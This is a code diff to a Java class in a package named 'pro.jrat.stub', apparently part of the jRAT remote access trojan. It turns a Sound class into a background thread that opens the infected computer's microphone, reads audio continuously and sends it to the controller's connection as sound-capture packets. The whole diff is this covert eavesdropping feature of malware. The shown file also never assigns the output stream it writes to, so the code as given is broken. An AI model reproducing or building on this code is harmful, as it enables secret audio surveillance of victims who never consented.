@@ -1,4 +1,5 @@
 package pro.jrat.stub;
+
 import java.io.DataOutputStream;
 
 import javax.sound.sampled.AudioFormat;
@@ -6,14 +7,23 @@ import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.DataLine;
 import javax.sound.sampled.TargetDataLine;
 
+import pro.jrat.stub.packets.outgoing.Packet58SoundCapture;
 
-public class Sound {
-	
-	public static AudioFormat format;
-	public static DataLine.Info info;
-	public static TargetDataLine line;
-	
-	public static void initialize() throws Exception {
+public class Sound implements Runnable {
+
+	public static Sound instance;
+
+	private AudioFormat format;
+	private DataLine.Info info;
+	private TargetDataLine line;
+	private DataOutputStream dos;
+	public boolean running;
+
+	public Sound() {
+		instance = this;
+	}
+
+	public void enable() throws Exception {
 		if (line != null) {
 			line.close();
 		}
@@ -23,14 +33,34 @@ public class Sound {
 		line.open();
 		line.start();
 	}
-	
-	public static void write(DataOutputStream dos) throws Exception {	
-		byte[] data = new byte[line.getBufferSize() / 5];
-		
-		line.read(data, 0, data.length);
-		
-		dos.writeInt(data.length);
-        dos.write(data);
+
+	public void disable() throws Exception {
+		if (line != null) {
+			line.close();
+		}
+	}
+
+	@Override
+	public void run() {
+		try {
+			enable();
+			running = true;
+			while (running) {
+				byte[] data = new byte[line.getBufferSize() / 5];
+
+				line.read(data, 0, data.length);
+
+				Connection.addToSendQueue(new Packet58SoundCapture());
+
+				dos.writeInt(data.length);
+				dos.write(data);
+
+				Connection.lock();
+			}
+			disable();
+		} catch (Exception ex) {
+			ex.printStackTrace();
+		}
 	}
 
 }
